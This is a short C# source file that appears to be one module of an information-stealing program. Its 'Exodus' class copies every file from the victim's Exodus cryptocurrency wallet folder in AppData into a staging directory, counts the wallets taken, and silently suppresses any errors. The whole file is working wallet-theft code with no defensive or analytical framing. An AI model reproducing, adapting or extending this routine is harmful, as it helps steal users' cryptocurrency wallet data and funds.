using System.IO;

namespace exos;

internal class Exodus
{
	public static int count = 0;

	public static string ExodusDir = "\\Wallets\\Exodus\\";

	public static void ExodusStr(string directorypath)
	{
		try
		{
			FileInfo[] files = new DirectoryInfo(Helper.AppData + "\\Exodus\\exodus.wallet\\").GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				Directory.CreateDirectory(directorypath + ExodusDir);
				fileInfo.CopyTo(directorypath + ExodusDir + fileInfo.Name);
			}
			count++;
			Counting.Wallets++;
		}
		catch
		{
		}
	}
}
